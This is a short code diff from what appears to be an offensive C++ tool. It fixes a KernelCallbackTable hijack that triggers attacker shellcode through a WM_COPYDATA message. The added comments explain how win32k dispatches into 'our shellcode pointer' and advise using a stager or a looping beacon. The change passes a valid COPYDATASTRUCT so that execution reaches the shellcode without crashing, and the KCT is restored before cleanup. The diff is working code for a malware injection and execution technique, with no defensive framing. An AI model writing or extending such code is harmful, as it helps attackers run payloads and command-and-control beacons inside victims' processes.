@@ -266,11 +266,15 @@ namespace erebus {
 
 		LOG_INFO("Triggering KCT[0x%02zX] via WM_COPYDATA", KCT_INDEX_COPYDATA);
 
+		// win32k dereferences lParam as COPYDATASTRUCT* in its WM_COPYDATA dispatch
+		// path before calling KCT[0x5E]. NULL lParam triggers a kernel-side AV that
+		// kills the process before shellcode is reached. Provide a valid (empty) CDS.
+		COPYDATASTRUCT cds = {};
 		// SendMessage is synchronous - it dispatches into win32k, which looks up
 		// KCT[0x5E] and calls our shellcode pointer. Execution returns here only
 		// after the shellcode returns (or crashes). This means the shellcode must
 		// return cleanly; use a stager or a beacon that loops internally.
-		pSendMessageA(hwnd, WM_COPYDATA, 0, 0);
+		pSendMessageA(hwnd, WM_COPYDATA, (WPARAM)hwnd, (LPARAM)&cds);
 
 		// Restore the original KCT before any cleanup so that window
 		// destruction messages dispatched by DestroyWindow find valid handlers.
